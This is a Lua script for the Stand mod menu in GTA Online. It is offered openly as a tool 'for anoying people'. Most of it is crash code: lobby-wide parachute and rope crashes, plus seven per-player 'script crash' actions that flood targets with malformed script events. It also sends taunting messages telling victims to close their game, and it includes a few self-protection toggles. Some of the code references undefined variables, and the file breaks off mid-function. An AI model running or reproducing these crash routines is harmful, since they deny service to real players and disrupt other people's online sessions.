util.keep_running()
util.require_natives(1663599433)

if not SCRIPT_MANUAL_START then
    util.stop_script()
end


local nrmal = menu.list(menu.my_root(), "Local Functions")
local protects = menu.list(menu.my_root(), "Protections")

local function RequestControl(Entity, timeout)
    local time = util.current_time_millis() + (timeout or 1000)
    while time > util.current_time_millis() and not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(Entity) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Entity)
        util.yield()
    end
    return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(Entity)
end

local function BlockSyncs(player_id, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= player_id then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    util.yield(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= player_id then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end

local function ClearEntities(list)
    for _, entity in pairs(list) do
        if ENTITY.DOES_ENTITY_EXIST(entity) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, false, false)
            RequestControl(entity)
            entities.delete_by_handle(entity)
        end
    end
end

local function RequestModel(Hash, timeout)
    STREAMING.REQUEST_MODEL(Hash)
    local time = util.current_time_millis() + (timeout or 1000)
    while time > util.current_time_millis() and not STREAMING.HAS_MODEL_LOADED(Hash) do
        util.yield()
    end
    return STREAMING.HAS_MODEL_LOADED(Hash)
end

local function CreateObject(Hash, Pos, static)
    RequestModel(Hash)
    local Object = entities.create_object(Hash, Pos)
    ENTITY.FREEZE_ENTITY_POSITION(Object, (static or false))
    return Object
end

local function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        util.yield()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end

util.toast("Welcome to <Todo> Script")
util.yield(1000)
util.toast("Whis script is for anoying people.")
util.yield(1000)
util.toast("If you were invited, congrats")
util.yield(10000)
util.toast("Made by Pichocles and Candy")
util.yield(2500)

local selectedobject = -1268884662
local all_objects = {-1268884662, 310817095, 4130089803, 148511758, 3087007557, 2969831089, 3533371316, 2024855755, 2450168807, 297107423}
local object_names = {"Bricks" ,"Fragment","Gas","Ball","Flagpole","Combat MG","Mag1","Barrel","40mm","Corp Rope"}

local planes = {'cargoplane', 'buzzard', 'savage', 'seasparrow', 'frogger2', 'bulldozer', 'flatbed', 'proptrailer', 'tr4'} -- 'buzzard', 'savage', 'seasparrow', 'frogger2', 'bulldozer', 'flatbed', 'proptrailer', 'tr4'
local coords = {
    {-1718.5878, -982.02405, 322.83115},
    {-2671.5007, 3404.2637, 455.1972},
    {9.977266, 6621.406, 306.46536 },
    {3529.1458, 3754.5452, 109.96472},
    {252, 2815, 120},
}
local to_ply = 1

function RqModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    local count = 0
    util.toast("Requesting model...")
    while not STREAMING.HAS_MODEL_LOADED(hash) and count < 100 do
        STREAMING.REQUEST_MODEL(hash)
        count = count + 1
        util.yield(10)
    end
    if not STREAMING.HAS_MODEL_LOADED(hash) then
        util.toast("Tried for 1 second, couldn't load this specified model!")
    end
end

function GetLocalPed()
    return PLAYER.PLAYER_PED_ID()
end

G_GeneratedList = false --

function AddEntityToList(listName, handle, generatedCheck)
    if ((not G_GeneratedList) and generatedCheck) or (not generatedCheck) then
        G_GeneratedList = true
        local lis = menu.list(menu.my_root(), listName .. " handle " .. handle, {}, "")
        menu.action(lis, "Delete", {}, "", function()
            entities.delete_by_handle(handle)
            menu.delete(lis)
            G_GeneratedList = false
        end)
        menu.action(lis, "Teleport to entity", {}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(handle)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(GetLocalPed(), pos.x, pos.y, pos.z + 1, false, false, false)
        end)
        menu.action(lis, "Drive Entity", {}, "", function()
            PED.SET_PED_INTO_VEHICLE(GetLocalPed(), handle, -1)
        end)
        menu.action(lis, "Teleport to you", {}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(handle, pos.x, pos.y, pos.z + 1, false, false, false)
        end)
    end
end

menu.action(nrmal, "Ka-Chow", {}, "Press and hold down the enter button", function()
    menu.trigger_commands("anticrashcamera on")
    menu.trigger_commands("potatomode on")
    if PED.IS_PED_IN_ANY_VEHICLE(GetLocalPed(), false) then
        local jet = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
        -- if VEHICLE.GET_VEHICLE_CLASS(jet) == 16 then --16 class is planes
        -- jet_netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(jet)
        ENTITY.SET_ENTITY_PROOFS(jet, true, true, true, true, true, true, true, true)
        -- ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        -- local let_coords = coords[math.random(1, #coords)]--function() for i =1, 32 do if PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i) then return ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i)) end end end
        if players.exists(to_ply) then 
            local asda = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(to_ply)) 
            util.toast('Player ID: '..to_ply..' | asda.x: '.. asda.x.. 'asda.y: '.. asda.y..'asda.z: '.. asda.z)
            ENTITY.SET_ENTITY_COORDS(jet, asda.x, asda.y, asda.z + 50, false, false, false, true) 
            to_ply = to_ply +1
        else 
            if to_ply >= 32 then to_ply = 0 end
            to_ply = to_ply +1 
            local let_coords = coords[math.random(1, #coords)]
            ENTITY.SET_ENTITY_COORDS(jet, let_coords[1], let_coords[2], let_coords[3], false, false, false, true) 
        end
            
        ENTITY.SET_ENTITY_VELOCITY(jet, 0, 0, 0) -- velocity sync fuck
        ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        local pedpos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
        pedpos.z = pedpos.z + 10
        for i = 1, 2 do
            local s_plane = planes[math.random(1, #planes)]
            RqModel(util.joaat(s_plane))
            local veha1 = entities.create_vehicle(util.joaat(s_plane), pedpos, 0)

            ENTITY.ATTACH_ENTITY_TO_ENTITY_PHYSICALLY(veha1, jet, 0, 0, 0, 0, 5 + (2 * i), 0, 0, 0, 0, 0, 0, 1000, true,
                true, true, true, 2)
        end
        AddEntityToList("Plane: ", jet, true)
        util.toast("Waiting 5sec for syncs...")
        util.yield(5000)
        for i = 1, 50 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jet, 252, 2815, 120, false, false, false) -- far away teleport (sync fuck)
            util.yield()
        end
    else
        util.toast("Alert | You are not in a vehicle")
        RqModel(util.joaat('hydra'))
        local spawn_in = entities.create_vehicle(util.joaat('hydra'), ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID()), 0.0)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), spawn_in, -1)
    end
    menu.trigger_commands("anticrashcamera off")
    menu.trigger_commands("potatomode off")
end)

menu.toggle_loop(protects, "Block PTFX", {}, "", function()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
end)

menu.toggle_loop(protects, "Anti Beast", {}, "Prevents you to become the beast.", function()
    if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0 then
        local host
        repeat
            host = NETWORK.NETWORK_GET_HOST_OF_SCRIPT("am_hunt_the_beast", -1, 0)
            util.yield()
        until host ~= -1
        util.toast(players.get_name(host).." started Hunt The Beast. Killing script...")
        menu.trigger_command(menu.ref_by_path("Online>Session>Session Scripts>Hunt the Beast>Stop Script"))
    end
end)

menu.action(protects, "Force stop all sounds", {"stopsounds"}, "", function()
    for i=-1,100 do
        AUDIO.STOP_SOUND(i)
        AUDIO.RELEASE_SOUND_ID(i)
    end
end)

menu.action(protects, "Remove ringtone", {}, "Removes phone ringtone.", function()
    local player = PLAYER.PLAYER_PED_ID()
    menu.trigger_commands("nophonespam on")
    if AUDIO.IS_PED_RINGTONE_PLAYING(player) then
        for i = -1, 50 do
            AUDIO.STOP_PED_RINGTONE(player)
        end
    end
    util.yield(1000)
    menu.trigger_commands("nophonespam off")
end)

menu.toggle(protects, "Panic Mode", {"panic"}, "This will block everything at total cost just for prevent someone to crash you.", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("desyncall on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        menu.trigger_commands("desyncall off")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end)

menu.toggle(protects, "Prevent Crash", {}, "Tries to block crashes \nActivate if someone is trying to crash you.", function(on_toggle)
    if on_toggle then
        local player = PLAYER.PLAYER_PED_ID()
        ENTITY.SET_ENTITY_COORDS(player, 25.030561, 7640.8735, 17.831139, 1, false)
        util.yield(800)
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("trafficpotato on")
        util.yield(2000)
        menu.trigger_commands("rclearworld")
    else        
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("anticrashcamera off")
        menu.trigger_commands("trafficpotato off")
        util.yield(800)
        menu.trigger_commands("tpmaze")
        util.yield(500)
        menu.trigger_commands("rclearworld")
        util.yield(1000)
        menu.trigger_commands("rcleararea")
        util.toast("Crasheo Prevenido :b")
    end
end)

local quitarf = menu.list(protects, "Metodos De Anti Freeze")

menu.action(quitarf, "Remove Freeze V1", {}, "Restarts some natives to unfreeze you.", function()
    --local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local player = PLAYER.PLAYER_PED_ID()
    ENTITY.FREEZE_ENTITY_POSITION(player, false)
    MISC.OVERRIDE_FREEZE_FLAGS()
    menu.trigger_commands("cleararea")
end)

menu.action(quitarf, "Remove Freeze V2", {}, "Restarts some natives to unfreeze you. \nYou will die with this method.", function()
    --local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local player = PLAYER.PLAYER_PED_ID()
    ENTITY.FREEZE_ENTITY_POSITION(player, false)
    ENTITY.SET_ENTITY_COORDS(player, 1, 0, 0, 1, false)
    MISC.OVERRIDE_FREEZE_FLAGS()
    menu.trigger_commands("cleararea")
end)

local servercrashes = menu.list(menu.my_root(), "Lobby Crashes", {}, "Ways to crash the entire lobby")

menu.toggle_loop(servercrashes, "Player Parachute Crash", {}, "", function()
    local ped = PLAYER.PLAYER_PED_ID()
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    local hashes = {util.joaat("prop_beach_parasol_02"), util.joaat("prop_parasol_04c")}
    for i = 1, #hashes do
        RqModel(hashes[i])
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), hashes[i])
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped, 0, 0, 500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped, 0xFBAB5776, 1000, false)
        util.yield(200)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(ped)
        end
        util.yield(1200)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped, pos.x, pos.y, pos.z, false, true, true)
end)

menu.toggle_loop(servercrashes, "Ruiner Parachute Crash", {}, "", function ()
    local ped = PLAYER.PLAYER_PED_ID()
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    RqModel(util.joaat("Ruiner2"))
    local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), pos, 0, true)
    PED.SET_PED_INTO_VEHICLE(ped, Ruiner2, -1)
    local hashes = {util.joaat("prop_beach_parasol_05"), util.joaat("prop_parasol_02")}
    for i = 1, #hashes do
        RqModel(hashes[i])
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, 0, 0, 500, false, true, true)
        util.yield(200)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, hashes[i])
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(1200)
    end
    entities.delete_by_handle(Ruiner2)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped, pos.x, pos.y, pos.z, false, true, true)
end)

menu.action(servercrashes, "Rope Crash No Notification ", {""}, "", function (player_id)
    PHYSICS.ROPE_LOAD_TEXTURES()
    local hashes = {2132890591, 2727244247}
    local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(player_id))
    local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
    local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
    ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
    local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
end)

menu.action(servercrashes,"R0 Crash", {""} ,"" , function(player_id)
    local pos = players.get_position(player_id)
    PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0.0, 0.0, 10.0, 1.0, 1, 0.0, 1.0, 1.0, false, false, false, 1.0, false, 0)
    local pos = players.get_position(player_id)
    entities.create_vehicle(pos,0X187D938D,0)
end)

menu.toggle_loop(servercrashes, "Indirect Freemode Crash", {}, "Midnight Destroy SH", function()
    util.trigger_script_event(players.get_script_host() , {1368055548,players.get_script_host(), 0, 1, 0})
end)

menu.action(servercrashes, "DR Crash", {}, "", function()
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,1349725314,-255678177,-255678177}
    local vehicles = {}
    for i = 1, 20 do
        util.create_thread(function()
            RqModel(hashes[i])
            menu.trigger_commands("anticrashcam on")
            local pcoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                util.yield(2000)
            end
            vehicles[#vehicles+1] = veh
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(player_id))
            local pos = players.get_position(player_id)
            local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
            local pos = players.get_position(player_id)
            util.yield(2000)
            PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
            util.yield(2000)
        end)
    end
    util.yield(2000)
    menu.trigger_commands("anticrashcam off")
    util.toast("finished.")
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end)

menu.action(menu.my_root(), "Go to Players List", {}, "Shotcut for players list.", function()
	menu.trigger_commands("playerlist")
end)

players.on_join(function(player_id)
    menu.divider(menu.player_root(player_id), "<Todo> Script")
    if G_GeneratedList then
        generatePlayerTeleports()
    end

    local todos = menu.list(menu.player_root(player_id), "<Todo> Script")

    local crashes = menu.list(todos, "Crashes", {}, "Op crashes")

    local scrashes = menu.list(crashes, "Script Crashes", {}, "Script based crashes \n(All menus will activate desync).")

    local begcrash = {
        "Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Please close your game, please please please please please",
    }

    menu.divider(scrashes, "Weird Script Crashes")

    menu.action(scrashes, "Frame Crash", {}, "Blocked by popular menus", function()
		menu.trigger_commands("smstext" .. PLAYER.GET_PLAYER_NAME(player_id).. " " .. begcrash[math.random(1, #begcrash)])
		util.yield()
		menu.trigger_commands("smssend" .. PLAYER.GET_PLAYER_NAME(player_id))
	end)

    menu.divider(scrashes, "Script Event")

    menu.action(scrashes, "Script crash 1", {}, "scrashv1", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end
    end)

    menu.action(scrashes, "Script crash 2", {"scrashv2"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 150 do
            util.trigger_script_event(1 << player_id, {0xA4D43510, player_id, 0xDF607FCD, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        end
    end)

    menu.action(scrashes, "Script crash 3", {"scrashv3"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 150 do
            util.trigger_script_event(1 << player_id, {2765370640, player_id, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        end
        util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {1348481963, player_id, math.random(int_min, int_max)})
        end
        util.yield(100)
        util.trigger_script_event(1 << player_id, {495813132, player_id, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << player_id, {495813132, player_id, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << player_id, {495813132, player_id,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
    end)

    menu.action(scrashes, "Script crash 4", {"scrashv4"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(scrashes, "Script crash 5", {"scrashv5"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
            end
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
    end)

    menu.divider(scrashes, "More script crashes")

    menu.action(scrashes, "Script crash 6", {"scrashv6"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {2765370640, player_id, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {1348481963, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-1733737974, player_id, 789522, 59486,48512151,-9545440,5845131,848153,math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-1529596656, player_id, 795221, 59486,48512151,-9545440 , math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end
        util.yield(100)
        util.trigger_script_event(1 << player_id, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << player_id, {962740265, 2000000, 2000000, 2000000, 2000000})
        util.trigger_script_event(1 << player_id, {1228916411, 1, 1245317585})
        util.trigger_script_event(1 << player_id, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
        util.trigger_script_event(1 << player_id, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
        util.trigger_script_event(1 << player_id, {-555356783, player_id, 85952,99999,52682274855,526822745})
        util.trigger_script_event(1 << player_id, {526822748, player_id, 78552,99999 ,7949161,789454312})
        util.trigger_script_event(1 << player_id, {-8965204809, player_id, 795221,59486,48512151,-9545440})
        util.trigger_script_event(1 << player_id, {495813132, player_id, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << player_id, {495813132, player_id, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << player_id, {495813132, player_id,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    
    end)

    menu.action(scrashes, "Script crash 7", {"scrashv7"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {2765370640, player_id, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {1348481963, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end
        util.yield(100)
        util.trigger_script_event(1 << player_id, {495813132, player_id, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << player_id, {495813132, player_id, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << player_id, {495813132, player_id,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << player_id, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << player_id, {962740265, 2000000, 2000000, 2000000, 2000000})
        util.trigger_script_event(1 << player_id, {1228916411, 1, 1245317585})
        util.trigger_script_event(1 << player_id, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
